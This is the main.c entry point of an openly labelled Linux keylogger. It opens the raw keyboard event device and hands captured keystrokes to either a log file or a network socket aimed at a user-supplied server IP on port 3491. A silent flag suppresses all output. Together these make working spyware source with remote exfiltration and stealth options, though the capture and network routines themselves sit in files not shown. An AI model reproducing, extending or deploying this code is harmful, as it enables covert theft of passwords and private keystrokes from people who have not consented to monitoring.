/**
 * @file main.c
 *
 * @brief Keylogger main entry point
 *
 * This keylogger captures raw keyboard events at the hardware level.
 * Since it records the physical key codes rather than the characters
 * produced by the current keyboard layout or language settings, it
 * registers keys in their default or ASCII representation.
 * Consequently, the recorded keys may not correspond to the actual
 * characters typed by the user in different language configurations.
 *
 * @author J. A. Corbal <jacorbal@gmail.com>
 * @version 1.0.4
 * @date Creation date: Mon Feb  9 10:15:47 UTC 2026
 * @date Updated 1.0.1: Thu Feb 12 10:22:51 UTC 2026
 * @date Updated 1.0.2: Thu Feb 12 14:26:29 UTC 2026
 * @date Updated 1.0.3: Thu Feb 12 10:26:32 UTC 2026
 * @date Updated 1.0.4: Fri Feb 13 00:01:02 UTC 2026
 *
 * @copyright Copyright (c) 2026, J. A. Corbal.
 *            ISC License <https://opensource.org/license/isc-license-txt>
 *
 * @note Built with `gcc` 14.2.0 and `clang` 19.1.7
 */
/* Copyright (c) 2026, J. A. Corbal <jacorbal@gmail.com>
 *
 * Permission to use, copy, modify, and distribute this software for any
 * purpose with or without fee is hereby granted, provided that the
 * above copyright notice and this permission notice appear in all
 * copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL
 * WARRANTIES WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS.  IN NO EVENT SHALL THE
 * AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL
 * DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR
 * PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER
 * TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
 * PERFORMANCE OF THIS SOFTWARE.
 */

#define _POSIX_C_SOURCE 200809L /* getopt, optarg */


/* System includes */
#include <errno.h>      /* errno */
#include <fcntl.h>      /* open, O_RDONLY, O_WRONLY, O_APPEND, O_CREAT */
#include <stdbool.h>    /* bool, true, false */
#include <stdio.h>      /* fprintf, printf, FILE */
#include <stdlib.h>     /* free */
#include <string.h>     /* strerror */
#include <sys/stat.h>   /* S_IRUSR, S_IWUSR, S_IRGRP, S_IROTH */
#include <unistd.h>     /* close, getopt, optarg */

/* Project includes */
#include <kbdfile.h>
#include <keylog.h>
#include <network.h>


/* Local definitions */
#define PROG_NAME         "keylog"
#define PROG_VERSION      "1.0.4"
#define PROG_VERSION_DATE "2026-02-13"

#define PORT "3491"     /**<  Port number for listening socket */


/**
 * @brief Print usage information for the program
 *
 * @param arg0 Name of the executable
 */
static void fprint_usage(FILE *fp, const char *arg0)
{
    fprintf(fp,
            "Usage: %s [-h | -v]\n"
            "       %s [-q | -s] [-t] (-n <ip_address> | -f <output_file>)\n"
            "Options:\n"
            "   -h                Show this help message and exit\n"
            "   -v                Show version message and exit\n"
            "   -q                Quiet; suppress 'stdout', keep 'stderr'\n"
            "   -s                Silent; suppress all output\n"
            "   -t                Don't prepend timestamp to keystroke\n"
            "   -n <ip_address>   Network output; server IP address\n"
            "   -f <output_file>  Write output to specified file\n",
            arg0, arg0);
}


/**
 * @brief Print version information for the program
 *
 * @param arg0 Name of the executable
 */
static void fprint_version(FILE *fp, const char *arg0)
{
    (void) arg0;

    fprintf(fp,
            "%s -- version %s (%s)\n"
            "Licensed under 'ISC License';"
            " Copyright (c) 2026, J. A. Corbal\n",
            PROG_NAME, PROG_VERSION, PROG_VERSION_DATE);
}


/* Main entry */
int main(int argc, char *const argv[])
{
    char *kbd_dev;          /* Keyboard device */
    int kbd_fd;             /* Keyboard file descriptor */
    int output_fd = -1;     /* Output file descriptor */
    bool network = false;
    bool file = false;
    bool add_timestamp = true;
    char *option_input;
    int option = 0;

    /* Get options */
    while ((option = getopt(argc, argv,"hvqstn:f:")) != -1) {
        switch(option) {
            case 'h':
               fprint_usage(stdout, argv[0]);
               return 0;
            case 'v':
               fprint_version(stdout, argv[0]);
               return 0;
            case 'q':
                freopen("/dev/null", "w", stdout);
                break;
            case 's':
                freopen("/dev/null", "w", stdout);
                freopen("/dev/null", "w", stderr);
                break;
            case 't':
                add_timestamp = false;
                break;
            case 'n':
                network = true;
                option_input = optarg;
                break;
            case 'f':
                file = true;
                option_input = optarg;
                break;
            default:
                fprint_usage(stderr, argv[0]);
                return 1;
        }
    }

    /* Only one of 'network' or 'file' must be true */
    if (!(network ^ file)) {
        fprint_usage(stderr, argv[0]);
        return 1;
    }

    /* Get keyboard device */
    kbd_dev = kbd_event_file();
    if (!kbd_dev) {
        fprint_usage(stderr, argv[0]);
        return 2;
    }

    /* If both arguments or neither are provided... */
    if (file) {
        if ((output_fd = open(option_input,
                        O_WRONLY | O_APPEND | O_CREAT,
                        S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)) == -1) {
            fprintf(stderr, "Error opening file '%s': %s\n",
                    option_input, strerror(errno));
            return 3;
        }
    } else if (network) {
        output_fd =
            nwk_socket_file_descriptor(option_input, (char *) PORT);
        if (output_fd < 0) {
            fprintf(stderr, "Error creating socket on %s\n",
                    option_input);
            return 3;
        }
    }

    if ((kbd_fd = open(kbd_dev, O_RDONLY)) == -1) {
        fprintf(stderr,
                "Error accessing keyboard from '%s'."
                " May require you to be superuser\n", kbd_dev);
        return 2;
    }

    /* Start the keylogger */
    printf("Initializing logging process...\n");
    keylogger_start(kbd_fd, output_fd, add_timestamp);
    printf("Logging process terminated.\n");

    /* Deallocate resources */
    close(kbd_fd);
    close(output_fd);
    free(kbd_dev);

    return 0;
}
